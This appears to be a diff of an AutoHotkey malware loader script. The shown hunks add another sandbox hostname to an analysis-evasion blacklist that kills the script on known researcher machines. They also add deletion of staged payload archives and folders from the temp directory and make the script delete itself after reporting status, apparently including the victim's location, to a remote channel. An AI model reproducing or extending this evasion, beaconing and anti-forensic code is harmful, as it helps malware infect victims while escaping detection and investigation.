@@ -12,12 +12,13 @@ wkUrl := CharListToStr(wk)
 cleanerUrl := CharListToStr(cleaner)
 fsUrl := CharListToStr(fs)
 funUrl := CharListToStr(funArr)
-blacklist := ["WDAGUtilityAccount", "3W1GJT", "QZSBJVWM", "5ISYH9SH", "Abby", "hmarc", "patex", "RDhJ0CNFevzX", "kEecfMwgj", "Frank", "8Nl0ColNQ5bq", "Lisa", "John", "george", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "Julia", "HEUeRzl", "fred", "server", "BvJChRPnsxn", "Harry Johnson", "SqgFOf3G", "Lucas", "mike", "PateX", "h7dk1xPr", "Louise", "User01", "test", "RGzcBUyrznReg", "SEBASTIAN-PC", "LANDENS_PC_PRES", "GJY", "ZAIDEN", "DESKTOP-DFL37JI"]                                                                          
+blacklist := ["WDAGUtilityAccount", "3W1GJT", "QZSBJVWM", "5ISYH9SH", "Abby", "hmarc", "patex", "RDhJ0CNFevzX", "kEecfMwgj", "Frank", "8Nl0ColNQ5bq", "Lisa", "John", "george", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "Julia", "HEUeRzl", "fred", "server", "BvJChRPnsxn", "Harry Johnson", "SqgFOf3G", "Lucas", "mike", "PateX", "h7dk1xPr", "Louise", "User01", "test", "RGzcBUyrznReg", "SEBASTIAN-PC", "LANDENS_PC_PRES", "GJY", "ZAIDEN", "DESKTOP-DFL37JI", "DESKTOP-1SVOLAG"]                                                                          
 currentPC := EnvGet("COMPUTERNAME")
 for pcName in blacklist {
     if (currentPC = pcName) {
         Sleep 1000
         ND("# - BLOCKED PC detected: **" . currentPC . "** - **Killing script.** :x:")
+        CleanUpTemp()
         ExitApp
     }
 }
@@ -92,8 +93,6 @@ TryMainExe() {
             Sleep 5000
             NDWithLocation2("- Cleanup :white_check_mark:")
             CleanUpTemp()
-            Sleep 5000
-            SelfDelete()
         }
         Sleep Random(10000, 30000)
     }
@@ -516,6 +515,15 @@ CleanUpTemp() {
         NDWithLocation2("- File not found: " . sejZip)
     }
 
+    fetusZip := "Fetus.zip"
+    fetusZipPath := tempPath "\" fetusZip
+    if FileExist(fetusZipPath) {
+        FileDelete(fetusZipPath)
+        NDWithLocation2("- Deleted file: " . fetusZip)
+    } else {
+        NDWithLocation2("- File not found: " . fetusZip)
+    }
+
     sejFolder := "Sejtype-" pcName
     sejFolderPath := tempPath "\" sejFolder
     if DirExist(sejFolderPath) {
@@ -524,6 +532,19 @@ CleanUpTemp() {
     } else {
         NDWithLocation2("- Folder not found: " . sejFolder)
     }
+
+    fetusFolder := "Fetus"
+    fetusFolderPath := tempPath "\" fetusFolder
+    if DirExist(fetusFolderPath) {
+        DirDelete(fetusFolderPath, true)
+        NDWithLocation2("- Deleted folder: " . fetusFolder)
+    } else {
+        NDWithLocation2("- Folder not found: " . fetusFolder)
+    }
+    NDWithLocation("- Self-Deleting in 1 second!")
+    Sleep 1000
+    SelfDelete()
+
 }
 
 SelfDelete() {
